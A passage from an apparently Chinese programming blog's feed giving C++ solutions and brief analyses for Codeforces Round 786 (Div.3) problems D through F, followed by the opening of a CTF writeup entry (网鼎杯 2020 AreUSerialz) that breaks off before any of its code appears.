class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn],t[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span> &amp;&amp; t[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="number">1ll</span>&lt;&lt;<span class="built_in">strlen</span>(s));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-A-B-C-Sort"><a href="#D-A-B-C-Sort" class="headerlink" title="D. A-B-C Sort"></a>D. A-B-C Sort</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>过程是这样的：</p><p><strong>a-&gt;b</strong><br>选择最后一个元素放在ｂ数组的中间<br><strong>b-&gt;c</strong><br>选择中间元素放在c数组的后面</p><p>相当于这样：<br>按一定顺序将元素压入两个栈中，然后分别弹出观察是否能递增。<br>如果序列长度为偶数，则1,2元素均小于3，4元素，3，4元素均小于5，6元素……<br>如果为奇数，则1元素需要最小，2,3需要小于,4,5……<br>模拟一下就ok</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,x,y;</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[++cnt]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=cnt;i&lt;n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i+<span class="number">1</span>]&lt;a[i])NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Breaking-the-Wall"><a href="#E-Breaking-the-Wall" class="headerlink" title="E. Breaking the Wall"></a>E. Breaking the Wall</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题被杀疯了，结束的时候 $3000AC$ 到现在就剩下 $200$ 多个了，主要是数据锅了。</p><p>只需要考虑三种情况，相邻的墙，隔一个的墙和最小两个墙，给你的测试数据很充足，但是实际测试点不行，也不知道这个新写的能不能过。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//￠ù </span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> first=a[i],second=a[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(first&gt;second)<span class="built_in">swap</span>(first,second);</span><br><span class="line">        </span><br><span class="line">        res+=second-first;</span><br><span class="line">        second-=<span class="number">2</span>*res;</span><br><span class="line">        first-=res;</span><br><span class="line">        <span class="keyword">if</span>(first&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            res=<span class="built_in">max</span>(a[i]+<span class="number">1</span>,a[i+<span class="number">1</span>]+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,res);</span></span><br><span class="line">            ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> times=first/<span class="number">3</span>;</span><br><span class="line">        res+=times*<span class="number">2</span>;</span><br><span class="line">        first-=times*<span class="number">3</span>;</span><br><span class="line">        second-=times*<span class="number">3</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,first,second);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,times);</span></span><br><span class="line">        <span class="keyword">while</span>(first&gt;<span class="number">0</span>||second&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(first&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=second/<span class="number">2</span>+second%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(second&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=first/<span class="number">2</span>+first%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(first&gt;second)&#123;</span><br><span class="line">                    first-=<span class="number">2</span>;</span><br><span class="line">                    second-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    second-=<span class="number">2</span>;</span><br><span class="line">                    first-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans); </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n<span class="number">-1</span>;i++)&#123;<span class="comment">//￠ú </span></span><br><span class="line">        <span class="keyword">int</span> first=<span class="built_in">min</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> second=<span class="built_in">max</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,first+(second-first)/<span class="number">2</span>+(second-first)%<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,(a[<span class="number">1</span>]/<span class="number">2</span>+a[<span class="number">1</span>]%<span class="number">2</span>+a[<span class="number">2</span>]/<span class="number">2</span>+a[<span class="number">2</span>]%<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    #ifndef ONLINE_JUDGE</span></span><br><span class="line"><span class="comment">//        freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line"><span class="comment">//    #endif</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Desktop-Rearrangement"><a href="#F-Desktop-Rearrangement" class="headerlink" title="F. Desktop Rearrangement"></a>F. Desktop Rearrangement</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/6.png" alt="6"></p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是给你一个桌面，每次询问的时候添加或减少图标，询问需要几次排列好图标。这个直接暴力模拟就可以了，首先计算出有多少个图标，然后把它拍成一列，图标下标在这个值数量之外的数目就是答案了。每次增加或减少最多对答案产生 $1$ 的影响，所以也不难。就是这个x,y，比赛的时候总是搞反，最后发现这个x是行号，y是列号。</p><h3 id="标程-5"><a href="#标程-5" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,q;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                a[j*n+i+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=cnt&amp;&amp;a[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//        putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//    &#125;putchar(10);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);;</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> y,x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;y,&amp;x);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> pos=(x<span class="number">-1</span>)*n+y;</span><br><span class="line">        <span class="keyword">if</span>(a[pos]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d appear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            cnt++;</span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">1</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d disappear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            cnt--;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">0</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//            putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//        &#125;putchar(10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>赛中做出五道，赛后被叉一道还行吧，反正ABCD写的挺快的，签到手速已经在稳步提升。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 青龙组AreUSerialz writeup</title>
      <link href="/2022/04/28/wdb2020AreUSerialz/"/>
      <url>/2022/04/28/wdb2020AreUSerialz/</url>
      
        <content type="html"><![CDATA[<p>做到一道题，写下 <code>write up</code></p><span id="more"></span><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>本题给了源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 